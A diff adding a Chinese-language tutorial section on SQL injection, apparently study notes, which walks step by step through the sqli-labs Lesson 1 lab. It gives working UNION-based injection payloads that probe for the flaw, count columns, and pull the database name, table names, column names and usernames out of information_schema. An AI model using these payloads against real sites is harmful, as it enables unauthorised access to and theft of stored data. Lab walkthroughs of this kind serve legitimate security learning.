@@ -183,6 +183,52 @@ SQL注入（SQL Injection）是一种攻击方式，攻击者通过向SQL查询�
 - 利用错误盲注（Error-Based Blind Injection），通过构造导致错误的SQL语句，分析错误信息的反馈来获取信息。
 - 编码/加密请求，避开输入验证和防火墙的检测。
 
+### For Example 
+sqli-labs Lesson 1
+
+1. ‌正常输入（id=1）‌
+‌原SQL语句‌：SELECT * FROM users WHERE id='1';
+‌原理‌：输入1被包裹在单引号内，语法正确，正常执行。
+2. ‌异常输入（id=1'）‌
+‌原SQL语句‌：SELECT * FROM users WHERE id='1'';
+‌报错原因‌：单引号未闭合，导致语法错误（id='1'后多出一个单引号）。
+‌攻击意义‌：通过错误信息确认存在注入点。
+3. ‌注释修复（id=1' --+）‌
+‌原SQL语句‌：SELECT * FROM users WHERE id='1' --+ ';
+‌原理‌：
+--+是SQL注释符（--），+被URL编码为空格。
+注释掉后续字符（包括原语句的';），修复语法错误。
+‌攻击意义‌：确认注入可行性。
+4. ‌探测列数（id=1' ORDER BY N --+）‌
+‌示例‌：id=1' ORDER BY 10 --+
+‌原SQL语句‌：SELECT * FROM users WHERE id='1' ORDER BY 10 -- ';
+‌原理‌：
+若原查询列数小于N，报错；反之正常。
+逐步调整N（如10→5→3）确定列数。
+‌攻击意义‌：为后续UNION查询做准备。
+5. ‌联合查询（id=-1' UNION SELECT 1,2,3 --+）‌
+‌示例‌：id=-1' UNION SELECT 1,2,3 --+
+‌原SQL语句‌：SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3 -- ';
+‌原理‌：
+id=-1确保原查询无结果，使页面显示UNION后的数据。
+页面显示2或3，表示该位置可回显数据。
+‌攻击意义‌：确定回显位，用于泄露信息。
+6. ‌泄露数据库名（id=-1' UNION SELECT 1,database(),3 --+）‌
+‌原SQL语句‌：SELECT ... UNION SELECT 1,database(),3 -- ';
+‌原理‌：database()返回当前数据库名（如security），显示在回显位。
+7. ‌泄露表名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) ...),3 --+）‌
+‌示例‌：SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'
+‌原理‌：
+information_schema.tables存储所有表信息。
+GROUP_CONCAT()将多行结果合并为字符串（如users,emails）。
+‌攻击意义‌：获取目标表名（如users）。
+8. ‌泄露列名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) ...),3 --+）‌
+‌示例‌：SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'
+‌原理‌：从information_schema.columns获取列名（如id,username,password）。
+9. ‌窃取数据（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM users),3 --+）‌
+‌示例‌：SELECT GROUP_CONCAT(username) FROM users
+‌原理‌：直接查询users表的username列，数据回显到页面。
+
 ```sql
 ?id=1' --+
 select * form users where id=1' --   
